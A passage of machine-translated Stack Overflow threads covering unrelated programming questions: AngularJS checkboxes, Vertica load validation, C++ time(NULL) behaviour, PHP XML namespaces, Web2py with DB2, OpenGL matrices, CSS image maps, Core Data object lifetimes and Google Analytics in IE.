app.directive('triStateCheckbox', function() {
  return {
    replace: true,
    restrict: 'E',
    scope: {
      checkboxes: '='
    },
    template: '<input type="checkbox" ng-model="master" ng-change="masterChange()">',
    controller: function($scope, $element) {
      $scope.masterChange = function() {
        for(i=0;i<$scope.checkboxes.length; i++)
          $scope.checkboxes[i].isSelected=$scope.master;
      };
      $scope.$watch('checkboxes', function() {
        var set=0;
        for (i=0;i<$scope.checkboxes.length;i++)
          set += $scope.checkboxes[i].isSelected?1:0;
        $element.prop('indeterminate', false);
        $scope.master = (set === 0) ? false : true;
        if (set > 0 && set < i) {
          $scope.master = false;
          $element.prop('indeterminate', true);
        }
      }, true);
    }
  };
}); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-02-13T07:12:51.910

我想它可以通过将 Angular 与 javascript 结合来解决：

```
<div>

<input type="checkbox" id="select-all" name="selectAll" value="" ng-click="checkAll($event)" />

<div >
  <input type="checkbox"  name="childCheckbox" value=""  />

  <input type="checkbox"  name="childCheckbox" value=""  />

  <input type="checkbox"  name="childCheckbox" value=""  />

  <input type="checkbox"  name="childCheckbox" value=""  />

  <input type="checkbox"  name="childCheckbox" value=""  />

  <input type="checkbox"  name="childCheckbox" value=""  />
 </div>

</div> 
```

在 checkAll() 中，以下逻辑将完成这项工作

```
 $scope.checkAll = function (source) {
   checkboxes = document.getElementsByName('childCheckbox');                                                 
   for (var i = 0, n = checkboxes.length; i < n; i++)   {
     checkboxes[i].checked = source.originalEvent.srcElement.checked;
   } 
```

# android - android：在java中设置文本字段位置，动态位置

> ID：12648468
> 
> 赞同：1
> 
> 时间：2012-09-28T23:10:00.620
> 
> 标签：android, position, coordinates, textfield

我是android编程的新手。

如何从 .java 文件活动中设置文本字段的位置？（我不想从 .xml 文件中更改它）我已经尝试过：

```
TextView tv = new TextView(this);
LayoutParams lp = new LayoutParams(
    LayoutParams.FILL_PARENT,
    LayoutParams.WRAP_CONTENT);
lp.setMargins(left, top, right, bottom); //use ints here
tv.setLayoutParams(lp); 
```

谢谢对不起我糟糕的英语

# sql - Vertica：重复/主键的数据验证

> ID：12648470
> 
> 赞同：7
> 
> 时间：2012-09-28T23:10:07.560
> 
> 标签：sql, database, database-design, duplicates, vertica

我正在尝试在加载期间创建一个验证过程，以确保数据不重复。Vertica 本身不支持此功能：

> Vertica 在运行查询时检查约束违规，而不是在加载数据时检查。要在加载过程中检测约束违规，请使用带有 NO COMMIT 选项的 COPY（第 667 页）语句。通过加载数据而不提交数据，您可以使用 ANALYZE_CONSTRAINTS 函数对数据进行加载后检查。如果函数发现约束违反，您可以回滚加载，因为您尚未提交它。

问题是我无法弄清楚如何以编程方式执行此操作。我怀疑我需要一个存储过程，但我不熟悉 vertica 的存储过程语法/限制。你能帮我吗？这是我所拥有的：

```
-- Create a new table. "id" is auto-incremented and "name" must be unique
CREATE TABLE IF NOT EXISTS my_table (
id IDENTITY
, name varchar(50) UNIQUE NOT NULL
, type varchar(20)
, description varchar(200)
);

--Insert a record
begin; 
copy my_table from stdin
abort on error
NO COMMIT; -- this begins the load
name1|type1|description1 --this is the load
\. -- this closes the load
commit;

-- insert the duplicate record
begin; 
copy my_table from stdin
abort on error
NO COMMIT; -- this begins the load
name1|type1|description1 --this is the load
\. -- this closes the load
commit; -- Surprisingly, the load executes successfully! What's going on?!?!

-- Check constraints. We see that there is a failed constraints:
select analyze_constraints('my_table'); 
```

我的想法是做一些条件逻辑。伪代码如下。你能帮我为 Vertica 做准备吗？

```
Begin
load data
if (select count(*) from (select analyze_constraints('my_table')) sub) == 0:
commit
else rollback 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T12:45:06.183

```
-- Start by Setting Vertica up to rollback and return an error code 
-- if an error is encountered.

\set ON_ERROR_STOP on

-- Load Data here (code omitted since you already have this)

-- Raise an Error condition by selecting 1/0 if any rows were rejected
-- during the load
SELECT
         GET_NUM_REJECTED_ROWS() AS NumRejectedRows
        ,GET_NUM_ACCEPTED_ROWS() AS NumAcceptedRows
;

SELECT 1 / (1-SIGN(GET_NUM_REJECTED_ROWS()));

-- Raise an Error condition if there are duplicates in my_table
SELECT 1 / ( 1 - SIGN( COUNT(*) ) )
FROM ( SELECT  name1,type1,description1
         FROM MY_TABLE
       GROUP BY 1,2,3
       HAVING COUNT(*) > 1 ) AS T1 ;

-- Raise an Error if primary key constraint is violated.
SELECT 1 / ( 1 - SIGN( COUNT(*) ) )
FROM (SELECT  ANALYZE_CONSTRAINTS ('my_table')) AS T1;

COMMIT; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T01:24:19.130

Vertica 没有存储过程。您需要在 Vertica 之外以某种方式以编程方式执行此操作。

您拥有的伪逻辑很好；只需在某些东西（JAVA、C++ 等）中实现它。您无需执行“回滚”。加载数据时（使用），在执行语句`NO COMMIT`之前不会提交。`COMMIT`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T14:40:10.203

使用 ansi 合并怎么样？

- 使用快速批量加载器将数据上传到临时表 - 从临时表合并到基表

# c++ - time(NULL) 在 Macbook Pro 上返回不一致的值

> ID：12648473
> 
> 赞同：-1
> 
> 时间：2012-09-28T23:11:04.227
> 
> 标签：c++, macos, time, race-condition

返回什么`time(NULL)`？给定文档，我假设它返回自纪元以来的秒数，但是，当我运行以下代码时：

```
#include <iostream>
#include "Time.h"
#include "Math.h"

int main () {

    double curT = 0;
    double curJ = 0;

    time_t curTtimeT = 0;
    double curJtimeT = 0;

    //run indefinitely... use a debugger you can stop :-)
    for (double j = 0; j < 2000000000; j++) {

        //get the current time
        curT = time(NULL);
        curTtimeT = time(NULL);

        //check if current time equals previous time
        if (time(NULL) != curT) {
            //output time and approx. "time" through iteration
            std::cout << "Time match with doubles:\t" << curT << "\tdeltaJ:\t\t\t" << (j - curJ) <<std::endl;
            curT = time(NULL);
            curJ = j;
        }

        if (time(NULL) != curTtimeT) {
            //output time and approx. "time" through iteration
            std::cout << "Time match with time_t:\t\t" << curTtimeT << "\t\tdeltaJtimeT:\t\t" << (j - curJtimeT) <<std::endl;
            curTtimeT = time(NULL);
            curJtimeT = j;
        }

    }
    return 0;
} 
```

我得到以下结果（跳过似乎在运行之间没有模式）：

```
Time match with time_t:     1348873002      deltaJtimeT:        290842
Time match with doubles:    1.34887e+09 deltaJ:         2.41017e+06
Time match with doubles:    1.34887e+09 deltaJ:         1.08409e+06
Time match with doubles:    1.34887e+09 deltaJ:         2.16587e+06
Time match with time_t:     1348873007      deltaJtimeT:        5.36928e+06
Time match with doubles:    1.34887e+09 deltaJ:         1.08696e+06
Time match with time_t:     1348873008      deltaJtimeT:        1.08696e+06
Time match with doubles:    1.34887e+09 deltaJ:         1.08534e+06
Time match with doubles:    1.34887e+09 deltaJ:         3.18296e+06
...
Time match with time_t:     1348873122      deltaJtimeT:        2.16217e+06
Time match with doubles:    1.34887e+09 deltaJ:         6.42553e+06
Time match with doubles:    1.34887e+09 deltaJ:         1.08727e+06
Time match with doubles:    1.34887e+09 deltaJ:         2.14147e+06
Time match with doubles:    1.34887e+09 deltaJ:         1.04733e+06
Time match with time_t:     1348873130      deltaJtimeT:        8.42965e+06 
```

*注意：我正在使用`deltaJ`输出以更数字化的方式显示在控制台实际输出此循环结果时的明显视觉差异。*

显然，这似乎并没有始终如一地返回自纪元以来的秒数，因为我反而能够看到非常一致的输出，即每秒`double`和`time_t`每秒都非常接近 1 行。`1348873002`相反，我错过了和之间的整个范围`1348873007`- 这些值似乎都没有通过`time(NULL)`. 这些间隙在此循环的整个运行时始终出现。

`1348873122`此外，有时它甚至在某些秒内不输出（参见和之间的差距`1348873130`）。

我不明白为什么输出不显示两种变量类型的一个条目，对于每一秒的实时。相反，它似乎`time(NULL)`不一致地返回自纪元以来的秒数，实际上跳过了一些值。

我错过了什么？

我在 Snow Leopard 上的 X-Code 3.2.5 中的 2.4GHz 双核 Macbook Pro 上运行这些测试（也许这个问题特定于我的系统）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:23:25.560

见[`<time.h>`](http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/time.h.html#tag_13_76)或[`time()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/time.html)：

```
time_t time(time_t *res); 
```

的类型`time_t`通常是有符号整数类型。

由于您使用`"Time.h"`，您可能对`time()`完全有不同的定义。

我更喜欢`<cstdio>`得到整齐对齐和格式化的输出（我是 C 程序员而不是 C++ 程序员），但代码可以编译为：

```
#include <ctime>
#include <cstdio>
using namespace std;

int main()
{
    double curT = 0;
    double curJ = 0;

    time_t curTtimeT = 0;
    double curJtimeT = 0;

    //run indefinitely... use a debugger you can stop :-)
    for (double j = 0; j < 2000000000; j++)
    { 
        //get the current time
        curT = time(NULL);
        curTtimeT = time(NULL);

        //check if current time equals previous time
        if (time(NULL) != curT) {
            printf("CurT:      %16.2f;  deltaJ: %16.2f\n", curT, j - curJ);
            curT = time(NULL);
            curJ = j;
        }

        if (time(NULL) != curTtimeT) {
            printf("CurTtimeT: %13lld;     deltaJ: %13lld\n", (long long)curTtimeT, (long long)(j - curJtimeT));
            curTtimeT = time(NULL);
            curJtimeT = j;
        }
    }
    return 0;
} 
```

这会产生如下输出：

```
CurT:         1348875805.00;  deltaJ:       1215329.00
CurT:         1348875806.00;  deltaJ:       1403669.00
CurTtimeT:    1348875806;     deltaJ:       2618998
CurTtimeT:    1348875807;     deltaJ:       1395183
CurT:         1348875808.00;  deltaJ:       2815155.00
CurT:         1348875809.00;  deltaJ:       1401716.00
CurTtimeT:    1348875809;     deltaJ:       2821688
CurT:         1348875810.00;  deltaJ:       1410729.00
CurT:         1348875811.00;  deltaJ:       1411382.00
CurTtimeT:    1348875811;     deltaJ:       2822111
CurTtimeT:    1348875812;     deltaJ:       1420231
CurT:         1348875813.00;  deltaJ:       2840762.00
CurTtimeT:    1348875815;     deltaJ:       4242399
CurT:         1348875816.00;  deltaJ:       4231937.00 
```

`Cur*`价值观是有意义的；这些`deltaJ`值是不相关的，因为您在循环计数器和时间值之间存在差异。我不确定你希望看到什么。

（MacBook Pro、2.3 GHz Intel Core i7、Mac OS X Lion 10.7.5、GCC 4.6.0——我需要在本周早些时候的灾难之后恢复我的 GCC 更高版本。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:25:31.230

> 显然，这似乎并没有始终如一地返回自纪元以来的秒数，相反，我将能够看到非常一致的输出，即每秒`double`和`time_t`每秒都非常接近 1 行。

这不遵循。我认为您打算让您的代码与实际情况有所不同。

具体来说，我认为你需要改变这一点：

```
 //run indefinitely... use a debugger you can stop :-)
    for (double j = 0; j < 2000000000; j++) {

        //get the current time
        curT = time(NULL);
        curTtimeT = time(NULL); 
```

对此：

```
 //get the current time
    curT = time(NULL);
    curTtimeT = time(NULL);

    //run indefinitely... use a debugger you can stop :-)
    for (double j = 0; j < 2000000000; j++) { 
```

因为事实上，您有一种竞争条件：您正在测试循环的*某些部分*`time`是否更改了返回值。显然，这不会 100% 发生。有时第二个会在循环的一个部分翻转，而其他时候它会在另一个部分翻转。

 ** * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T23:36:18.730

我认为您的测试代码有点过于复杂。您的第一列看起来正确，但您没有显示所有数字，因此您看不到秒数。使用 time_t plus double 只会混淆输出。试试这个——它很笨拙，但它每秒都会显示新的时间。

```
#include <iostream>
#include "Time.h"

int main () {
    //get the current time
    time_t currtime = time(NULL);

    //run indefinitely... use a debugger you can stop :-)
    for (double j = 0; j < 2000000000; j++) {

        //wait until a second has passed
        while (time(NULL) < currtime + 1) {
        };
        currtime = time(NULL);
        std::cout << "Time: " << currtime << "\n";
    }
    return 0;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T23:25:35.553

您在这里假设您的应用程序在没有任何干扰的情况下运行：您的系统是一个先发制人的系统，因此有时操作系统可能会与您的进程相交以处理其他事情：您的“时间跳跃”可能是因为这个（即使我是仍然好奇它是否会放弃您的过程 5 秒钟，这仍然可能发生）...

此外，我认为您的代码可能会因某些优化而导致您的代码工作方式有所不同：我建议检查编译器的设置并禁用优化以查看是否有任何区别......

您也可以尝试检查任何溢出，即使这不太可能，考虑到您的系统（64 位整数应该足以满足您在这里所做的工作）......

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T23:35:23.190

> 相反，我将能够看到非常一致的输出，即每秒 double 和 time_t 非常接近 1 行。

这正是您*不应该*期望看到的。您应该期望看到很多明显的随机性，而这正是您所看到的。循环的每次迭代都会进行两到六次调用，`time()`有时会生成格式化输出，有时不会。I/O 是昂贵的，格式化的 I/O 是非常昂贵的，系统调用如`time()`：它们也很昂贵。

除了运行应用程序之外，您的计算机还在做许多其他事情。它正在创建需要在屏幕上显示的内容，它正在检查您的计算机是否需要更新，它正在运行一些防病毒程序，它正在更新一些您没有关闭的浏览器页面，等等。CPU 不断切换上下文在运行您的程序和运行无数其他活动程序之间。这些系统调用是切换上下文的理想场所（也是首选场所）。

在您的循环的每次迭代中有八个地方是您的程序邀请操作系统切换上下文的地方。看到很多变化并不奇怪。*

# php - Php、Spl、SimpleXMLIterator

> ID：12648475
> 
> 赞同：0
> 
> 时间：2012-09-28T23:11:24.063
> 
> 标签：php, xml, spl

我试图理解一些指导部分，在以下解释中我真的失去了逻辑：

**首先是代码**：[链接](http://codepad.org/fYNMzH1W)

**现在指南**：

> 当两个文档可能具有相似的名称时，XML 中就会出现问题。如果我们有动物的 xml 文档和另一个动物所有者，则可能会在名称节点中出现冲突。每个动物和所有者都有一个名称节点，并且需要一种方法来区分它们。SimpleXMLIterator 提供了几种管理命名空间的方法。这些包括在本章顶部列出的内容。下面的脚本显示了对已使用的 xml 字符串的一个小改动，并演示了名称空间的使用以及如何在 SimpleXMLIterator 中使用它们。

**这是给出代码之前的部分，现在这是代码之后给出的部分**：

> 在上面的脚本中，我们在根目录中声明了一个命名空间，也不是添加到第二个名称节点的 XML 中。这以 spec: 前缀来标识命名空间，而不是将其与常规动物名称混淆。使用 SimpleXMLIterator::registerXPathNamespace() 方法可确保文档名称空间前缀是合理的。要获取命名空间，SimpleXMLIterator::getDocNamespaces() 方法用于获取文档中声明的所有命名空间的名称。也可以使用 SimpleXMLIterator::getNamespaces() 方法。SimpleXMLIterator::getDocNamespaces() 方法只获取那些在文档本身中实际声明的命名空间。

**问题**：

问题是我认为我不理解作者，如果有人可以用另一种语言解释这段代码，我将在我的逻辑无法理解的代码中指出弱点：

*   Tag (spec:name) //**在 XML 代码处。**
*   $sxi-> registerXPathNamespace('spec', 'http://www.exampe.org/species-title'); //**这个方法和 2 个参数。**
*   $result = $sxi->xpath('//spec:name'); //**这个方法带参数。**
*   $sxi->getDocNamespaces('animal') //**在 foreach 循环中。**

如果有人可以专注于我提到的那些部分并尝试另一个词，谢谢大家，祝您有美好的一天。

# python - Web2py 与 DB2 一起工作

> ID：12648480
> 
> 赞同：2
> 
> 时间：2012-09-28T23:12:16.707
> 
> 标签：python, db2, web2py, pyodbc, unixodbc

有人知道如何使用远程 DB2 服务器在 Linux 上运行 Web2py 吗？

我尝试使用 pyodbc，但它的文档很差

我找不到它的分步指南。

我的配置文件：

odbcinst.ini：

```
[DB2]
Description     = DB2 Driver
Driver          = /opt/odbc_cli/clidriver/lib/libdb2.so
FileUsage       = 1
DontDLClose     = 1 
```

odbc.ini

```
[test]
Description     = Test to DB2
Driver          = DB2 
```

尝试连接：

```
>>> import pyodbc
>>> cnxn = pyodbc.connect('DRIVER={DB2};SERVER=172.16.1.35;DATABASE=log10;UID=db2admin;PWD=passs')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
pyodbc.Error: ('08001', '[08001] [unixODBC][IBM][CLI Driver] SQL30081N  A communication error has been detected. Communication protocol being used: "TCP/IP".  Communication API being used: "SOCKETS".  Location where the error was detected: "127.0.0.1".  Communication function detecting the error: "connect".  Protocol specific error code(s): "111", "*", "*".  SQLSTATE=08001\n (-30081) (SQLDriverConnect)') 
```

我错过了什么？在此先感谢
基督教

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T16:32:57.843

这是典型的通信问题错误。在连接之前，请尝试检查连接性：

什么是实例端口？默认值为 50000，但您未在连接语句中指定 1。

什么是 IP 地址/主机名？如果您的情况似乎是 172.16.1.35

在该端口尝试 telnet

```
telnet 172.16.1.35 50000 
```

如果可以建立连接，您将收到如下消息：

```
Trying 172.16.1.35...
Connected to hostname.
Escape character is '^]'. 
```

如果您有连接问题，您将看到

```
Trying 172.16.1.35...
telnet: Unable to connect to remote host: Connection refused 
```

据我所知，您必须在执行程序之前检查实例端口和连接设置。可能是防火墙问题，您是否检查了打开的端口？在服务器中尝试 netstat -nato，查看 DB2 实例是否处于活动状态并监听端口（目前未知）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-02T18:09:41.360

我使用 PHP 连接到远程 DB2 服务器，这就是我的 /etc/odbc.ini 文件的样子：

```
[primary]
Description             = primary
Driver                  = iseries
System                  = xxx.xxx.xxx.xxx
UserID                  = xxxxxxxxxx
Password                = xxxxxxxxxx
Naming                  = 0
DefaultLibraries        = QGPL
Database                = XXXXXXXXXX
ConnectionType          = 0
CommitMode              = 2
ExtendedDynamic         = 0
DefaultPkgLibrary       = QGPL
DefaultPackage          = A/DEFAULT(IBM),2,0,1,0,512
AllowDataCompression    = 1
LibraryView             = 0
AllowUnsupportedChar    = 0
ForceTranslation        = 0 
```

我的 /etc/odbcinst.ini 文件如下所示：

```
[iseries]
Description     = iSeries Access for Linux ODBC Driver
Driver          = /usr/lib/libcwbodbc.so
Setup           = /usr/lib/libcwbodbcs.so
NOTE1           = If using unixODBC 2.2.11 or later and you want the 32 and 64-bit ODBC drivers to share DSN's,
NOTE2           = the following Driver64/Setup64 keywords will provide that support.
Driver64        = /usr/lib/lib64/libcwbodbc.so
Setup64         = /usr/lib/lib64/libcwbodbcs.so
Threading       = 2
DontDLClose     = 1
UsageCount      = 1 
```

我提到这一点是因为我认为您在配置文件中缺少一些信息。

# c++ - VBO 消失，坏矩阵？

> ID：12648482
> 
> 赞同：1
> 
> 时间：2012-09-28T23:12:25.703
> 
> 标签：c++, opengl, matrix, vbo

我不知道为什么，但我的 VBO 在一帧后消失（初始帧在原点显示它的角度不正确） 下面是我的矩阵类、绘制方法和顶点着色器的代码。

```
Matrix::Matrix() { 
    for (int i = 0; i < 16; i++) {
        values[i] = 0;
    }
}

Matrix Matrix::operator*(const Matrix &matrix) {
    Matrix result;

    for (int i = 0; i < 4; i++) {
        for (int j = 0; j < 4; j++) {
            for (int k = 0; k < 4; k++) {
                result.values[i * 4 + j] += this->values[i * 4 + k] * matrix.values[k * 4 + j];
            }
        }
    }

    return result;
}

Matrix Matrix::Perspective(float fov, float aspect, float znear, float zfar) {
    Matrix matrix;

    float xymax = znear * tan(fov * 0.00872664);
    float q = -(zfar * znear) / (zfar - znear);
    float val = znear / xymax;

    matrix.values[0] = val / aspect;
    matrix.values[5] = val;
    matrix.values[10] = q;
    matrix.values[11] = -1;
    matrix.values[14] = 2 * q;

    return matrix;
}

Matrix Matrix::LookAt(Vector3f eye, Vector3f target, Vector3f up) {

    Vector3f zaxis = Vector3f::Normalize(target - eye);
    Vector3f xaxis = Vector3f::Normalize(Vector3f::CrossProduct(up, zaxis));
    Vector3f yaxis = Vector3f::CrossProduct(zaxis, xaxis);
    // vy doesn't need to be normalized because it's a cross product of 2 normalized vectors

    Matrix viewMatrix;
    viewMatrix.values[0]  = xaxis.x;
    viewMatrix.values[1]  = xaxis.y;
    viewMatrix.values[2]  = xaxis.z;
    viewMatrix.values[3]  = 0;

    viewMatrix.values[4]  = yaxis.x;
    viewMatrix.values[5]  = yaxis.y;
    viewMatrix.values[6]  = yaxis.z;
    viewMatrix.values[7]  = 0;

    viewMatrix.values[8]  = zaxis.x;
    viewMatrix.values[9]  = zaxis.y;
    viewMatrix.values[10] = zaxis.z;
    viewMatrix.values[11] = 0;

    viewMatrix.values[12] = 0;
    viewMatrix.values[13] = 0;
    viewMatrix.values[14] = 0;
    viewMatrix.values[15] = 1;

    Matrix translationMatrix = Matrix::Identity();
    translationMatrix.values[12] = -eye.x;
    translationMatrix.values[13] = -eye.y;
    translationMatrix.values[14] = -eye.z;

    return translationMatrix * viewMatrix;
}

Matrix Matrix::Identity() {
    Matrix matrix;
    matrix.values[0] = 1;
    matrix.values[5] = 1;
    matrix.values[10] = 1;
    matrix.values[15] = 1;
    return matrix;
} 
```

变量：

```
static const GLfloat g_vertex_buffer_data[] = 
{
    -1.0f, -1.0f, 0.0f,
    1.0f, -1.0f, 0.0f,
    0.0f, 1.0f, 0.0f
};
GLuint vertexbuffer;
GLuint programID; 
```

绘制方法：

```
void draw() {
    glClearColor(0.5, 0.5, 0.5, 1.0);
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT | GL_STENCIL_BUFFER_BIT);
    glUseProgram(programID);

    Matrix projection = Matrix::Perspective(45.0f, (float)(screen_size.x) / screen_size.y, 0.1f, 1000.0f);
    Matrix view = Matrix::LookAt(Vector3f(4, 3, 3), Vector3f(0, 0, 0), Vector3f(0, 1, 0));
    Matrix model = Matrix::Identity();
    Matrix mvp = projection * view * model;

    GLuint matrixID = glGetUniformLocation(programID, "mvp");
    glUniformMatrix4fv(matrixID, 1, GL_FALSE, mvp.values);

    int positionId = glGetAttribLocation(programID, "position");
    glEnableVertexAttribArray(positionId);
    glBindBuffer(GL_ARRAY_BUFFER, vertexbuffer);
    glVertexAttribPointer(positionId, 3, GL_FLOAT, GL_FALSE, 0, (void *)0);

    glDrawArrays(GL_TRIANGLES, 0, 3);
    glDisableVertexAttribArray(positionId);

    glutSwapBuffers();
} 
```

顶点着色器：

```
in vec3 position;
uniform mat4 mvp;

void main() {
    gl_Position = mvp * vec4(position, 1);
} 
```

# html - css中的图像地图标题？

> ID：12648487
> 
> 赞同：1
> 
> 时间：2012-09-28T23:13:20.310
> 
> 标签：html, css, image, mapping, imagemap

我这里有一些代码试图显示图片，然后将鼠标悬停在显示标题的某些部分上。

我有它处理文本，但不是图片。我几乎没有使用过 css，但对 html 相当熟悉。这里有什么问题，我怎样才能让它工作？理想情况下，它应该与“剑”这个词的作用相同。

```
<html>
<body background="Gray.jpeg"> 

<style type="text/css">
ul, li {
    list-style: none;
}

ul.bindel {
    position: relative;
    float: center;
    width: 514px;
    height: 528px;
    /* background: url(Gladiators.jpeg) no-repeat; */
    background: url(http://4.bp.blogspot.com/_XJDCOO_PcIc/TRknvnbiNNI/AAAAAAAAEDg/6KPijl4Dtl0/s1600/Gladiators.jpg) no-repeat;
    border: 1px solid #000000;
}

ul.bindel li a span.caption {
    display: none;
    position: absolute;
    top: 20px;
    left: 50px;
    width: 270px;
    padding: 5px;
}

ul.bindel li a:hover {
    display: inline;
    cursor: pointer;
}

ul.bindel li a:hover span.caption {
    display: block;
    border: 3px solid #333333;
    color: white;
    font-size: 17px;
    background: #330000;
    text-align: left;
}

a.bl {
    width: 257px;
    height: 264px;
    margin-top: 0px;
    margin-left: 0px;
}

a.bl:hover {
    border: 3px solid #000000;
}

a.br {
    width: 257px;
    height: 264px;
    margin-top: 0px;
    margin-left: 258px;
}

a.br:hover {
    border: 3px solid #000000;
}

a.bind {
    position: relative;
}

a.bind span {
    display: none;
    position: absolute;
    top: 20px;
    left: 50px;
    width: 270px;
    padding: 5px;
}

a.bind:hover {
    display: inline;
    cursor: pointer;
}

a.bind:hover span {
    display: block;
    border: 3px solid #333333;
    color: white;
    font-size: 17px;
    background: #330000;
    text-align: left;
}
</style>
<center><br>
<a class="bind">Sword<span>The gladiators would use this in close combat.</span></a><br><br><br><br>

<ul class="bindel">
    <li><a id="bl"><span class="caption">Left Side</span></a></li>
    <li><a id="br"><span class="caption">Right side</span></a></li>
</ul>

</center></body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T01:16:48.567

您可以使用 html ImageMap 和一些 javascript 来实现这种功能。

我不禁认为这是一个粗略的实现，因为它在使用与我不同的屏幕分辨率 (1366x768) 时会中断。我认为您可以通过将图像和标题放在同一个 div 中来克服这个问题。然后，您可以使字幕的位置相对，而不是绝对。然后，您的左侧和顶部坐标将相对于保存图像的容器，而不是相对于浏览器窗口的左上角。这样做可能意味着代码可以在不同尺寸的屏幕上工作，如果图像不再位于页面中心，它也会继续工作。

图像地图坐标是通过在剑和盾周围绘制简单的多边形来确定的，在将它们输入到 html 之前跟踪它们的 x/y 坐标。

只需更改图像的 src（我使用了本地副本，厌倦了等待加载测试的每次迭代）

享受！

```
<html>
<head>
<style type="text/css">
a.bind {
    position: relative;
}

a.bind span {
    display: none;
    position: absolute;
    top: 20px;
    left: 50px;
    width: 270px;
    padding: 5px;
    border: 3px solid #333333;
    color: white;
    font-size: 17px;
    background: #330000;
    text-align: left;
}

a.bind:hover {
    display: inline;
    cursor: pointer;
}

a.bind:hover span {
    display: block;
}

.caption
{
    display: none;
    border: 3px solid #333333;
    color: white;
    font-size: 17px;
    background: #330000;
    text-align: left;
    position: absolute;
    width: 270px;
}

#shieldCapt
{
    left: 920px;
    top: 380px;
}

#swordCapt
{
    left: 600px;
    top: 480px;
}
</style>

<script>
function myHover(element)
{
    var hoveredElement = element;
    var tgt = hoveredElement.getAttribute('tgt');
    tgt = document.getElementById(tgt);
    tgt.style.display = 'inline';
}

function myLeave(element)
{
    var hoveredElement = element;
    var tgt = hoveredElement.getAttribute('tgt');
    tgt = document.getElementById(tgt);
    tgt.style.display = 'none';
}
</script>

</head>

<body> 
<center>
<br>
<a class="bind">Sword<span>The gladiators would use this in close combat.</span></a>
<br>
<br>
<br>

<img src='img/gladiators.png' usemap='#imgMap'>
<map name="imgMap">
    <area id='swordPoly' shape="polygon" tgt='swordCapt' onmouseover='myHover(this);' onmouseout='myLeave(this);' coords="227,307,261,309, 339,354, 328,371, 240,331, 227,307">
    <area id='shieldPoly' shape="polygon" tgt='shieldCapt' onmouseover='myHover(this);' onmouseout='myLeave(this);' coords="413,245, 475,215, 473,200, 511,307, 526,388, 497,408, 454,422, 422,339, 413,245">
</map>

<br>
<span class='caption' id='shieldCapt'>The gladiators would defend themeselves with this.</span>
<span class='caption' id='swordCapt'>The gladiators would use this in close combat.</span>

</center>
</body>
</html> 
```

# iphone - 如果要删除托管对象，将托管对象传递给视图、管理器和块是否安全？

> ID：12648488
> 
> 赞同：1
> 
> 时间：2012-09-28T23:13:42.840
> 
> 标签：iphone, objective-c, ios, core-data

我正在编写一个 Core Data 应用程序，并且我已经开始将我的对象传递给我的视图和管理器。例如，我的 UIImageView 子类知道如何从对象中提取图像数据，如果尚未加载图像数据，它知道如何获取、分配和使用图像。我有一个单例管理器将数据上传到服务器，这些管理器获取托管对象，然后在成功上传时使用服务器 ID 更新它们。

这似乎是错误的方法，因为我正在删除托管对象（服务器告诉我对象已在服务器端被删除）。问题是对象可以从我的视图和管理器下方删除。

更多示例：如果完成块仍持有该对象，则将使用已删除的托管对象调用它。如果通知或用户事件在消失之前进入视图，它也会尝试访问已删除的对象。是的，当底层对象被删除（不再匹配我的获取谓词）时，我的表视图/集合视图将刷新并删除关联的视图，但仍然存在完成块。

如果要删除对象，像这样传递托管对象是否安全？到目前为止，这种方法就像做梦一样，我开始认为我需要将托管对象与我的所有视图和管理器完全分离。也就是说，控制器获取对象，创建视图/单元格并设置所有需要的数据（包括在委托操作发生时引用对象的 ID），然后让对象再次出现故障。当用户以任何方式与视图交互时，它必须回调控制器，获取相关对象并使用该数据。我应该停止持有我的托管对象，还是有一种干净的方法来检查整个地方的 .isDeleted？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:21:50.803

如果你的 moc 只在主线程上工作，那么它可能不会太危险，但我想说的不是一个好的设计决策。如果您在主线程之外进行 moc 工作（私有调度队列或使用 new-ado-of-ios5 选项让 moc 使用私有队列），那么您所做的就是鲁莽。

我有类似的设计，但在 moc 上使用了 new-private-queue 选项。任何想要从 moc 获得某些东西的对象都必须通过我的单例接口获取它，该接口确实使用“performBlock”命令。这种设计的好处是，当我写作时，我只使用“performBlock”。检索信息显然是使用“performBlockAndWait”完成的。

这个界面给了我很大的自由来重构核心数据代码，而不必接触其他任何东西（我现在已经做了 4 次了）。

[编辑：此链接中](https://stackoverflow.com/a/12641229/1633251)有更多细节

# javascript - Google Analytics 脚本未在 IE 中触发。页面上没有其他元素会破坏脚本

> ID：12648489
> 
> 赞同：2
> 
> 时间：2012-09-28T23:13:48.050
> 
> 标签：javascript, internet-explorer, google-analytics, doctype

我有一个页面，上面只有 Google Analytics 代码。它适用于除 IE 之外的所有浏览器，我什至可以在此页面上触发其他脚本；但是，GA 脚本不会触发。我正在使用 Fiddler 来验证它是否正常工作。

少了什么东西？这令人沮丧。

IE9 64 位

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-947358-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

</head>
<body>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T02:43:22.247

IE9 具有跟踪保护功能——如果 google-analytics.com 在跟踪保护列表中，它可能会阻止加载 ga.js。

# ruby - 如何使用 Capybara 启用证书信任？

> ID：12648490
> 
> 赞同：1
> 
